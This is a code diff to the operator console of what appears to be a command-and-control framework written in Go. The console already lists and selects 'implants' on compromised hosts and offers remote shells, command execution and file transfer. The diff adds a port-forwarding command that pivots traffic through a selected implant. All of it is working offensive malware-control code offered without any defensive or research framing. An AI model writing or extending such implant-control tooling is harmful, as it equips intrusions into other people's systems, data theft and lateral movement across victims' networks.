@@ -42,18 +42,19 @@ func (o *Operator) RunCLI() {
 			return
 
 		case "help":
-			fmt.Println("  list              — show registered implants")
-			fmt.Println("  select <idx>      — select implant by index")
-			fmt.Println("  ps                — list processes on selected implant")
-			fmt.Println("  ls <path>         — list directory")
-			fmt.Println("  cd <path>         — change directory")
-			fmt.Println("  pwd               — print working directory")
-			fmt.Println("  shell             — interactive shell (direct stream)")
-			fmt.Println("  exec <cmd> [args] — execute command (with output)")
-			fmt.Println("  download <path>   — download file from implant")
-			fmt.Println("  upload <src> <dst> — upload file to implant")
-			fmt.Println("  help              — this help")
-			fmt.Println("  exit              — quit")
+			fmt.Println("  list                   — show registered implants")
+			fmt.Println("  select <idx>           — select implant by index")
+			fmt.Println("  ps                     — list processes on selected implant")
+			fmt.Println("  ls <path>              — list directory")
+			fmt.Println("  cd <path>              — change directory")
+			fmt.Println("  pwd                    — print working directory")
+			fmt.Println("  shell                  — interactive shell (direct stream)")
+			fmt.Println("  portfwd <port> <host:p> — forward local port through implant")
+			fmt.Println("  exec <cmd> [args]      — execute command (with output)")
+			fmt.Println("  download <path>        — download file from implant")
+			fmt.Println("  upload <src> <dst>     — upload file to implant")
+			fmt.Println("  help                   — this help")
+			fmt.Println("  exit                   — quit")
 
 		case "list":
 			implants := o.ListImplants()
@@ -145,6 +146,24 @@ func (o *Operator) RunCLI() {
 			fmt.Printf("opening shell to %s@%s...\n", selected.Name, selected.Hostname)
 			if err := o.OpenShell(selected.PeerID); err != nil {
 				fmt.Printf("shell error: %v\n", err)
+			}
+
+		case "portfwd":
+			if selected == nil {
+				fmt.Println("no implant selected (use 'select <idx>')")
+				continue
+			}
+			if len(args) < 2 {
+				fmt.Println("usage: portfwd <local-port> <target-host:target-port>")
+				continue
+			}
+			localPort, err := strconv.Atoi(args[0])
+			if err != nil {
+				fmt.Printf("bad port: %v\n", err)
+				continue
+			}
+			if err := o.Portfwd(selected.PeerID, localPort, args[1]); err != nil {
+				fmt.Printf("portfwd error: %v\n", err)
 			}
 
 		case "download":
